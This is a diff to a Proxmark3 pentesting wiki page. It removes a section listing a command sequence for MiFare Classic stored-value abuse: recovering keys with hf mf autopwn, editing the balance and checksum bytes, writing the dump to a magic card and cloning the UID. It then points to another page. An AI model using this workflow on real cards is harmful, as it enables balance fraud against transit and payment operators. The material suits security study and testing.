@@ -37,33 +37,7 @@ The Proxmark3 allows to perform other actions like **eavesdropping** a **Tag to 
 
 #### MiFare Classic quick workflow for stored-value abuse
 
-When terminals store balances on Classic cards, a typical end-to-end flow is:<sup>[[4]](#references)</sup>
-
-```bash
-# 1) Recover sector keys and dump full card
-proxmark3> hf mf autopwn
-
-# 2) Modify dump offline (adjust balance + integrity bytes)
-#    Use diffing of before/after top-up dumps to locate fields
-
-# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
-proxmark3> hf mf cload -f modified.bin
-
-# 4) Clone original UID so readers recognize the card
-proxmark3> hf mf csetuid -u <original_uid>
-```
-
-Notes
-
-- `hf mf autopwn` orchestrates nested/darkside/HardNested-style attacks, recovers keys, and creates dumps in the client dumps folder.<sup>[[1]](#references)</sup>
-- Writing block 0/UID only works on magic gen1a/gen2 cards. Normal Classic cards have read-only UID.<sup>[[2]](#references)</sup>
-- Many deployments use Classic "value blocks" or simple checksums. Ensure all duplicated/complemented fields and checksums are consistent after editing.<sup>[[4]](#references)</sup>
-
-See a higher-level methodology and mitigations in:
-
-{{#ref}}
-pentesting-rfid.md
-{{#endref}}
+For the key-recovery, balance-diffing, integrity-field, and UID-cloning sequence—including the Proxmark3 client transcript and magic-card limitations—see [MiFare Classic offline stored-value tampering](pentesting-rfid.md#mifare-classic-offline-stored-value-tampering-broken-crypto1).
 
 ### Raw Commands
 
